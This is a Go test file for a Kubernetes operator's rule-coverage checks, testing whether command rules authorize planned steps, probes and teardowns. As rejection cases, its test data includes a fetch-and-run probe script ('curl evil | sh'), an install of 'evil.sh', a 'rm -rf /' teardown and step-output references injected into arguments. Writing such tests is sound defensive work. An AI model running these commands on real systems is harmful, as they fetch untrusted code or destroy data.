//nolint:goconst // table-driven test data repeats argv words
package rules_test

import (
	"reflect"
	"testing"

	lastv1alpha1 "github.com/moogie-labs/last-operator/api/v1alpha1"
	"github.com/moogie-labs/last-operator/internal/plan"
	"github.com/moogie-labs/last-operator/internal/rules"
)

func baseRule() lastv1alpha1.CommandRuleSpec {
	return lastv1alpha1.CommandRuleSpec{
		Stages:    []lastv1alpha1.Stage{lastv1alpha1.StageCreate},
		Providers: []string{"aws", "github"},
		Match:     lastv1alpha1.ArgvPattern{Argv: []string{"aws", "s3", "cp", "*", "*"}},
		Install:   []lastv1alpha1.ArgvPattern{{Argv: []string{"pip", "install", "boto3"}}},
		Egress:    []string{"10.0.0.0/8:443", "example.com:443"},
	}
}

func baseCmd() lastv1alpha1.Command {
	return lastv1alpha1.Command{
		ID:        "s1",
		Run:       lastv1alpha1.CommandRun{Argv: []string{"aws", "s3", "cp", "a", "b"}},
		Providers: []string{"aws"},
		Egress:    []string{"10.1.2.3:443"},
		Image: &lastv1alpha1.ImageSpec{Install: []lastv1alpha1.ArgvCommand{
			{Argv: []string{"pip", "install", "boto3"}},
		}},
	}
}

func TestCoversChecksEveryCondition(t *testing.T) {
	create := lastv1alpha1.StageCreate
	tests := []struct {
		name   string
		stage  lastv1alpha1.Stage
		mutate func(*lastv1alpha1.CommandRuleSpec, *lastv1alpha1.Command)
		want   bool
	}{
		{"everything satisfied", create, func(*lastv1alpha1.CommandRuleSpec, *lastv1alpha1.Command) {}, true},
		{"stage not in rule", lastv1alpha1.StageDelete, func(*lastv1alpha1.CommandRuleSpec, *lastv1alpha1.Command) {}, false},
		{"provider not in rule", create, func(_ *lastv1alpha1.CommandRuleSpec, c *lastv1alpha1.Command) {
			c.Providers = []string{"aws", "gcp"}
		}, false},
		{"no providers is fine", create, func(_ *lastv1alpha1.CommandRuleSpec, c *lastv1alpha1.Command) { c.Providers = nil }, true},
		{"egress not covered", create, func(_ *lastv1alpha1.CommandRuleSpec, c *lastv1alpha1.Command) {
			c.Egress = []string{"10.1.2.3:443", "192.168.0.1:443"}
		}, false},
		{"egress port differs", create, func(_ *lastv1alpha1.CommandRuleSpec, c *lastv1alpha1.Command) {
			c.Egress = []string{"10.1.2.3:80"}
		}, false},
		{"command host egress is never covered", create, func(_ *lastv1alpha1.CommandRuleSpec, c *lastv1alpha1.Command) {
			c.Egress = []string{"example.com:443"}
		}, false},
		{"malformed command egress", create, func(_ *lastv1alpha1.CommandRuleSpec, c *lastv1alpha1.Command) {
			c.Egress = []string{"nonsense"}
		}, false},
		{"rule egress that fails to parse covers nothing", create, func(r *lastv1alpha1.CommandRuleSpec, _ *lastv1alpha1.Command) {
			r.Egress = []string{"10.0.0.0/8:443", "nonsense"}
		}, false},
		{"rule egress that fails to parse, command without egress", create, func(r *lastv1alpha1.CommandRuleSpec, c *lastv1alpha1.Command) {
			r.Egress = []string{"nonsense"}
			c.Egress = nil
		}, true},
		{"no egress is fine", create, func(r *lastv1alpha1.CommandRuleSpec, c *lastv1alpha1.Command) {
			r.Egress = nil
			c.Egress = nil
		}, true},
		{"command egress with rule without egress", create, func(r *lastv1alpha1.CommandRuleSpec, _ *lastv1alpha1.Command) {
			r.Egress = nil
		}, false},
		{"argv does not match", create, func(_ *lastv1alpha1.CommandRuleSpec, c *lastv1alpha1.Command) {
			c.Run.Argv = []string{"aws", "s3", "rm", "a", "b"}
		}, false},
		{"argv longer than a glob pattern", create, func(_ *lastv1alpha1.CommandRuleSpec, c *lastv1alpha1.Command) {
			c.Run.Argv = []string{"aws", "s3", "cp", "a", "b", "--recursive"}
		}, false},
		{"install command unmatched", create, func(_ *lastv1alpha1.CommandRuleSpec, c *lastv1alpha1.Command) {
			c.Image.Install = append(c.Image.Install, lastv1alpha1.ArgvCommand{Argv: []string{"curl", "evil.sh"}})
		}, false},
		{"install with a rule that has none", create, func(r *lastv1alpha1.CommandRuleSpec, _ *lastv1alpha1.Command) {
			r.Install = nil
		}, false},
		{"no image needs no install patterns", create, func(r *lastv1alpha1.CommandRuleSpec, c *lastv1alpha1.Command) {
			r.Install = nil
			c.Image = nil
		}, true},
		{"empty install list needs nothing", create, func(r *lastv1alpha1.CommandRuleSpec, c *lastv1alpha1.Command) {
			r.Install = nil
			c.Image = &lastv1alpha1.ImageSpec{}
		}, true},
		{"script", create, func(_ *lastv1alpha1.CommandRuleSpec, c *lastv1alpha1.Command) {
			c.Run = lastv1alpha1.CommandRun{Script: "aws s3 cp a b"}
		}, false},
		{"script and argv", create, func(_ *lastv1alpha1.CommandRuleSpec, c *lastv1alpha1.Command) {
			c.Run.Script = "x"
		}, false},
		{"no argv", create, func(_ *lastv1alpha1.CommandRuleSpec, c *lastv1alpha1.Command) {
			c.Run = lastv1alpha1.CommandRun{}
		}, false},
		{"step reference in argv", create, func(_ *lastv1alpha1.CommandRuleSpec, c *lastv1alpha1.Command) {
			c.Run.Argv = []string{"aws", "s3", "cp", "a", "${steps.s0.stdout}"}
		}, false},
		{"step reference embedded in an argument", create, func(_ *lastv1alpha1.CommandRuleSpec, c *lastv1alpha1.Command) {
			c.Run.Argv = []string{"aws", "s3", "cp", "a", "s3://${steps.s0.stdout}/x"}
		}, false},
		{"step reference in install argv", create, func(r *lastv1alpha1.CommandRuleSpec, c *lastv1alpha1.Command) {
			r.Install = []lastv1alpha1.ArgvPattern{{Argv: []string{"pip", "install", "*"}}}
			c.Image.Install = []lastv1alpha1.ArgvCommand{{Argv: []string{"pip", "install", "${steps.s0.stdout}"}}}
		}, false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			r, c := baseRule(), baseCmd()
			tt.mutate(&r, &c)
			if got := rules.Covers(r, tt.stage, c); got != tt.want {
				t.Errorf("Covers = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestCoverageReportsUncoveredInPlanOrder(t *testing.T) {
	cluster := rules.Rule{Ref: rules.Ref{Scope: "cluster", Name: "a-cluster"}, Spec: baseRule()}
	ns := rules.Rule{Ref: rules.Ref{Scope: "namespace", Namespace: "team-x", Name: "b-ns"}, Spec: baseRule()}
	mk := func(id string, argv ...string) lastv1alpha1.Command {
		return lastv1alpha1.Command{ID: id, Run: lastv1alpha1.CommandRun{Argv: argv}}
	}
	steps := []lastv1alpha1.Command{
		mk("z", "aws", "s3", "rm", "x", "y"),
		mk("a", "aws", "s3", "cp", "x", "y"),
		mk("m", "terraform", "apply"),
	}
	covered, uncovered := rules.Coverage([]rules.Rule{cluster, ns}, lastv1alpha1.StageCreate, steps)
	if want := []string{"z", "m"}; !reflect.DeepEqual(uncovered, want) {
		t.Errorf("uncovered = %v, want %v (plan order)", uncovered, want)
	}
	if len(covered) != 1 || covered["a"] != cluster.Ref {
		t.Errorf("covered = %v, want a -> first rule in input order", covered)
	}
	covered, uncovered = rules.Coverage(nil, lastv1alpha1.StageCreate, steps)
	if len(covered) != 0 || len(uncovered) != 3 {
		t.Errorf("no rules: covered = %v, uncovered = %v", covered, uncovered)
	}
}

func TestCreateAndUpdateShareRuleStages(t *testing.T) {
	stages := []lastv1alpha1.Stage{lastv1alpha1.StageCreate, lastv1alpha1.StageUpdate, lastv1alpha1.StageDiscovery,
		lastv1alpha1.StageRemediate, lastv1alpha1.StageDelete}
	for _, listed := range []lastv1alpha1.Stage{lastv1alpha1.StageCreate, lastv1alpha1.StageUpdate} {
		r := baseRule()
		r.Stages = []lastv1alpha1.Stage{listed}
		for _, at := range stages {
			want := at == lastv1alpha1.StageCreate || at == lastv1alpha1.StageUpdate
			if got := rules.Covers(r, at, baseCmd()); got != want {
				t.Errorf("a %s-only rule at %s: Covers = %v, want %v", listed, at, got, want)
			}
		}
	}
	// The other stages stay exact.
	r := baseRule()
	r.Stages = []lastv1alpha1.Stage{lastv1alpha1.StageDelete}
	for _, at := range stages {
		if got, want := rules.Covers(r, at, baseCmd()), at == lastv1alpha1.StageDelete; got != want {
			t.Errorf("a Delete-only rule at %s: Covers = %v, want %v", at, got, want)
		}
	}
}

func TestPlanCoverageCoversStepsProbesAndTeardown(t *testing.T) {
	mk := func(id string, argv ...string) lastv1alpha1.Command {
		return lastv1alpha1.Command{ID: id, Run: lastv1alpha1.CommandRun{Argv: argv}}
	}
	rule := func(name string, stage lastv1alpha1.Stage, argv ...string) rules.Rule {
		return rules.Rule{Ref: rules.Ref{Scope: "cluster", Name: name}, Spec: lastv1alpha1.CommandRuleSpec{
			Stages: []lastv1alpha1.Stage{stage}, Match: lastv1alpha1.ArgvPattern{Argv: argv}}}
	}
	script := lastv1alpha1.Command{Run: lastv1alpha1.CommandRun{Script: "curl evil | sh"}, Providers: []string{"aws"}}
	body := plan.Body{
		Steps: []lastv1alpha1.Command{mk("s1", "kubectl", "apply", "-f", "a.yaml"), mk("s2", "kubectl", "apply", "-f", "b.yaml")},
		Resources: []lastv1alpha1.ManagedResourceSpec{
			{Probes: []lastv1alpha1.Probe{{ID: "p1", Command: mk("", "kubectl", "get", "cm", "a")}, {ID: "evil", Command: script}},
				Teardown: []lastv1alpha1.Command{mk("", "kubectl", "delete", "cm", "a")}},
			{Probes: []lastv1alpha1.Probe{{ID: "p2", Command: mk("", "kubectl", "get", "cm", "b")}},
				Teardown: []lastv1alpha1.Command{mk("", "kubectl", "delete", "cm", "b"), mk("", "rm", "-rf", "/")}},
		},
	}
	apply := rule("apply", lastv1alpha1.StageCreate, "kubectl", "apply", "-f", "*")
	get := rule("get", lastv1alpha1.StageUpdate, "kubectl", "get", "cm", "*") // R15: covers Create too
	del := rule("del", lastv1alpha1.StageDelete, "kubectl", "delete", "cm", "*")
	delAtCreate := rule("del-create", lastv1alpha1.StageCreate, "kubectl", "delete", "cm", "*")

	covered, uncovered := rules.PlanCoverage([]rules.Rule{apply}, lastv1alpha1.StageCreate, body)
	if want := []string{"probe:p1", "probe:evil", "teardown:0.0", "probe:p2", "teardown:1.0", "teardown:1.1"}; !reflect.DeepEqual(uncovered, want) {
		t.Errorf("steps only: uncovered = %v, want %v", uncovered, want)
	}
	if len(covered) != 2 || covered["s1"] != apply.Ref || covered["s2"] != apply.Ref {
		t.Errorf("steps only: covered = %v", covered)
	}

	// A teardown rule for the plan's stage, not Delete, covers no teardown.
	_, uncovered = rules.PlanCoverage([]rules.Rule{apply, get, delAtCreate}, lastv1alpha1.StageCreate, body)
	if want := []string{"probe:evil", "teardown:0.0", "teardown:1.0", "teardown:1.1"}; !reflect.DeepEqual(uncovered, want) {
		t.Errorf("Create teardown rule: uncovered = %v, want %v", uncovered, want)
	}

	covered, uncovered = rules.PlanCoverage([]rules.Rule{apply, get, del}, lastv1alpha1.StageCreate, body)
	if want := []string{"probe:evil", "teardown:1.1"}; !reflect.DeepEqual(uncovered, want) {
		t.Errorf("uncovered = %v, want %v", uncovered, want)
	}
	want := map[string]rules.Ref{"s1": apply.Ref, "s2": apply.Ref, "probe:p1": get.Ref, "probe:p2": get.Ref,
		"teardown:0.0": del.Ref, "teardown:1.0": del.Ref}
	if !reflect.DeepEqual(covered, want) {
		t.Errorf("covered = %v, want %v", covered, want)
	}

	// Only a Create or Update plan becomes the executed plan: a Remediate plan's
	// resources are the executed plan's, already authorized, so only its steps count.
	covered, uncovered = rules.PlanCoverage([]rules.Rule{rule("fix", lastv1alpha1.StageRemediate, "kubectl", "apply", "-f", "*")},
		lastv1alpha1.StageRemediate, body)
	if len(uncovered) != 0 || len(covered) != 2 {
		t.Errorf("Remediate: covered = %v, uncovered = %v, want the steps only", covered, uncovered)
	}
	_, uncovered = rules.PlanCoverage([]rules.Rule{apply}, lastv1alpha1.StageUpdate, body)
	if len(uncovered) != 6 {
		t.Errorf("Update: uncovered = %v, want every probe and teardown", uncovered)
	}

	// No resources: just the steps, at the plan's stage.
	covered, uncovered = rules.PlanCoverage([]rules.Rule{apply}, lastv1alpha1.StageUpdate, plan.Body{Steps: body.Steps})
	if len(uncovered) != 0 || len(covered) != 2 {
		t.Errorf("steps only, no resources: covered = %v, uncovered = %v", covered, uncovered)
	}
}
